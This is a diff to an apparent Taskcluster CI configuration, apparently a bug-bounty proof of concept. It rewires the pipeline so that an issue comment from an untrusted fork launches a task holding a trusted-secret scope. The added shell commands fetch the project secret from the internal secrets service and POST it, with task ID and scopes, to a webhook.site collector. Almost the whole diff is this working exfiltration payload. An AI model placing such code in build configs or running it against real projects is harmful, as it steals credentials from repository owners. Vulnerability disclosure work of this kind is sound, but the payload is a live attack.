@@ -3,24 +3,45 @@ reporting: checks-v1
 policy:
   pullRequests: collaborators
   allowComments: collaborators
-autoCancelPreviousChecks: true
+
 tasks:
-  - $if: '(tasks_for == "github-pull-request" && event["action"] in ["opened","reopened","synchronize"]) || (tasks_for == "github-issue-comment" && event["action"] in ["created"])'
+  - $if: 'tasks_for == "github-issue-comment"'
     then:
-      taskId: {$eval: as_slugid("test")}
-      taskGroupId: {$eval: as_slugid("test")}
       created: {$fromNow: ''}
-      deadline: {$fromNow: '1 day'}
       taskQueueId: docker-compose/generic-worker
+      schedulerId: taskcluster-ui
+      deadline: {$fromNow: '30 minutes'}
+      scopes:
+        - secrets:get:project/poc/trusted-secret
+
       metadata:
-        name: plswork
-        description: plswork
-        owner: ${event.sender.login}@users.noreply.github.com
-        source: ${event.repository.html_url}
+        name: "Attacker payload"
+        description: |
+          This task was created via an issue_comment event on a PR from an
+          untrusted fork.
+        owner: attacker@example.com
+        source: http://taskcluster/tasks/create
+
       payload:
-        maxRunTime: 3600
+        maxRunTime: 600
         image: node
         command:
           - /bin/bash
           - -c
-          - echo "Hello, World!"
+          - |
+            set -e
+            SECRET=$(curl -sf "http://taskcluster/secrets/v1/secret/project/poc/trusted-secret")
+
+            echo "Fetched secret payload:"
+            echo "$SECRET" | jq .
+
+            # Exfiltrate to the collector
+            curl -sS -X POST \
+              -H "Content-Type: application/json" \
+              -d "{\"taskId\":\"$TASK_ID\",\"scopes\":\"$TASK_SCOPES\",\"secret\":$SECRET,\"note\":\"H1 PoC\"}" \
+              https://webhook.site/31ad84a9-95a3-418c-aed3-66c79584c733
+
+            echo "=========================================="
+            echo "PoC complete. Check $COLLECTOR_URL for the exfiltrated secret."
+            echo "=========================================="
+            
